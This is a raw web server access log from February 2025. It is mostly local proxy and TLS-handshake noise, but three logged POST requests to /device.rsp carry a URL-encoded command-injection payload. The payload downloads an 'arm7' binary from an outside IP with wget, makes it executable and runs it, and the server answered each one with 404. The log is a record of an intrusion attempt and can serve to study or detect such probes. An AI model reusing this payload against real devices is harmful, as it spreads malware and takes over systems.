::1 - - [18/Feb/2025:21:49:32 +0300] "GET /index.php HTTP/1.1" 200 71275
::1 - - [18/Feb/2025:21:50:32 +0300] "-" 408 -
127.0.0.1 - - [18/Feb/2025:21:52:20 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:20 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:52:20 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:20 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:52:24 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:24 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:35 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
91.224.92.10 - - [18/Feb/2025:21:52:44 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:21:52:52 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:52 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:52:52 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:52:52 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:53:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:53:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:54:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:54:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:21:54:57 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:21:58:36 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
91.224.92.10 - - [18/Feb/2025:22:00:31 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
46.19.143.10 - - [18/Feb/2025:22:02:48 +0300] "GET / HTTP/1.1" 200 66524
87.121.84.7 - - [18/Feb/2025:22:03:59 +0300] "GET / HTTP/1.1" 200 66289
127.0.0.1 - - [18/Feb/2025:22:04:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:04:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:04:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:04:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:04:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:04:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:05:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
